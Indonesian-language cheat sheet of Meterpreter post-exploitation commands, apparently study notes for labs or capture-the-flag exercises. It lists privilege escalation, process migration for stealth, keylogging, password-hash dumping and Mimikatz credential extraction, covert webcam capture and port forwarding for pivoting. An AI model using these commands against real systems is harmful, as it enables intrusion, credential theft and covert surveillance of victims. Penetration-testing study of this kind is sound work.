# 🛡️ Meterpreter Mastery: Advanced Post-Exploitation Notes

> **Author:** Sepka 
> **Topic:** Cybersecurity - Metasploit Framework  
> **Target OS:** Windows & Linux

---

## 📑 Overview
Meterpreter adalah payload mutakhir dari Metasploit yang berjalan sepenuhnya di memori (RAM). Payload ini menggunakan teknik **In-Memory DLL Injection** agar tidak meninggalkan jejak di harddisk target dan sulit dideteksi oleh antivirus tradisional.

---

## 🚀 1. Essential First Steps
Segera jalankan perintah ini setelah sesi Meterpreter terbuka untuk menentukan strategi selanjutnya.

| Command | Description |
| :--- | :--- |
| `sysinfo` | Menampilkan informasi OS dan arsitektur (x64/x86). |
| `getuid` | Cek identitas user saat ini. |
| `getsystem` | Upaya otomatis untuk eskalasi hak akses ke **SYSTEM**. |
| `getprivs` | Melihat daftar izin (privileges) yang dimiliki shell. |
| `shell` | Berpindah ke terminal asli sistem target (CMD/Bash). |

---

## 🕵️ 2. Stealth & Stability
Agar shell tidak terputus saat user menutup aplikasi yang dieksploitasi.

### Migration
Gunakan ini untuk memindahkan shell ke proses yang lebih stabil (seperti `explorer.exe` atau `services.exe`).
```bash
ps                # Lihat daftar proses
getpid            # Cek PID shell saat ini
migrate [PID]     # Pindah ke proses yang lebih aman
📁 3. File System Operations
Manipulasi data dan mencari informasi sensitif (Flags/Credentials).

Pencarian: search -f flag*.txt (Mencari file flag di seluruh drive).

Transfer:

download [path_target] : Ambil file dari target ke Kali.

upload [path_kali] : Kirim file dari Kali ke target.

Navigasi: ls, cd, pwd, mkdir.

Eksaminasi: cat [file] (Baca isi file tanpa men-download).

🔑 4. Post-Exploitation & Spying
Bagian paling krusial untuk mengumpulkan data rahasia.

⌨️ Keylogging
Mencatat setiap ketikan keyboard user (Password, Chat, Email).

Bash
keyscan_start    # Mulai merekam
keyscan_dump     # Ambil hasil rekaman
keyscan_stop     # Berhenti merekam
🔓 Password & Hash
Bash
hashdump         # Mengambil hash password dari database SAM
load kiwi        # Load extension Mimikatz (untuk melihat password plain-text)
creds_all        # Menampilkan semua kredensial yang tersimpan di memori
📸 Surveillance
screenshot : Ambil tangkapan layar desktop target.

webcam_snap : Ambil foto lewat kamera target secara diam-diam.

🌐 5. Networking & Pivoting
Menggunakan komputer target sebagai jembatan untuk menyerang jaringan internal lainnya.

ipconfig / ifconfig : Cek konfigurasi IP target.

route : Melihat tabel routing untuk identifikasi jaringan internal.

Port Forwarding:

Bash
portfwd add -l 3389 -p 3389 -r [IP_Target]
